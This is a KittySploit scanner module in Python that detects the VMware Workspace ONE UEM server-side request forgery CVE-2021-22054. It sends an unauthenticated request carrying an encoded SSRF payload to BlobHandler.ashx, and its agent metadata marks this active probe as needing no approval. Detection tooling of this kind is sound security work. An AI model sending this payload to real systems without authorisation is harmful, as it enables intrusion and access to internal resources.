#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""VMware Workspace ONE UEM console 20."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'VMWare Workspace ONE UEM - Server-Side Request Forgery Detection',
        'description': 'VMware Workspace ONE UEM console 20.0.8 prior to 20.0.8.37, 20.11.0 prior to 20.11.0.40, 21.2.0 prior to 21.2.0.27, and 21.5.0 prior to 21.5.0.37 contain a server-side request forgery vulnerability. This issue may allow a malicious actor with network access to UEM to send their requests without authentication and to gain access to sensitive information.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'vmware', 'workspace', 'ssrf', 'vkev', 'vuln', 'kev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.assetnote.io/2022/04/27/vmware-workspace-one-uem-ssrf/',
            'https://www.vmware.com/security/advisories/VMSA-2021-0029.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-22054',
            'https://github.com/fardeen-ahmed/Bug-bounty-Writeups',
            'https://github.com/nomi-sec/PoC-in-GitHub',
        ],
        'cve': 'CVE-2021-22054',
    }

    def run(self):
        r = self.http_request(method="GET", path='/Catalog/BlobHandler.ashx?Url=YQB3AGUAdgAyADoAawB2ADAAOgB4AGwAawBiAEoAbwB5AGMAVwB0AFEAMwB6ADMAbABLADoARQBKAGYAYgBHAE4ATgBDADUARQBBAG0AZQBZAE4AUwBiAFoAVgBZAHYAZwBEAHYAdQBKAFgATQArAFUATQBkAGcAZAByAGMAMgByAEUAQwByAGIAcgBmAFQAVgB3AD0A', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Interactsh Server',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="VMWare Workspace ONE UEM - Server-Side Request Forgery detected",
                path='/Catalog/BlobHandler.ashx?Url=YQB3AGUAdgAyADoAawB2ADAAOgB4AGwAawBiAEoAbwB5AGMAVwB0AFEAMwB6ADMAbABLADoARQBKAGYAYgBHAE4ATgBDADUARQBBAG0AZQBZAE4AUwBiAFoAVgBZAHYAZwBEAHYAdQBKAFgATQArAFUATQBkAGcAZAByAGMAMgByAEUAQwByAGIAcgBmAFQAVgB3AD0A',
            )
            return True
        return False

